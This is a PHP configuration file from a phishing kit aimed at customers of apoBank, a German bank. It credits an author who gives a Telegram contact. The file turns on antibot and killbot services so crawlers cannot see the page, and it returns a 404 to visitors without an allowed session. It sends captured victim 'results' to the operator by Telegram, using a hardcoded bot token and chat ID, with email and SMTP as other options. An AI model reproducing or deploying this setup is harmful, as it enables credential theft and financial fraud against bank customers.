<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    session_start();
    error_reporting(0);

    if( !isset($_SESSION['user_allowed']) && $_SESSION['user_allowed'] !== true ) {
        header('HTTP/1.0 404 Not Found');
        exit();
    }
    
    require_once 'func.php';
    require_once 'BrowserDetection.php';
    require_once 'panel.php';

    define("ANTIBOTPW_API", ''); // ANTIBOT.PW API
    define("KILLBOT_API", ''); // KILLBOT.ORG API
    antibotpw();
    killbot();

    define("PASSWORD", 'apo');
    define('PANEL', "http://localhost/scams/apobank/panel/");

    define("TELEGRAM_TOKEN", '5805130760:AAE3mc7VMmiL2gCpXPUFaVUq9e2o-6WWCwQ');
    define("TELEGRAM_CHAT_ID", '1049319923');

    define("RECEIVER", 'your@email.com');

    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');

    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1

    define("OFFICIAL_WEBSITE", 'https://www.apobank.de/');

?>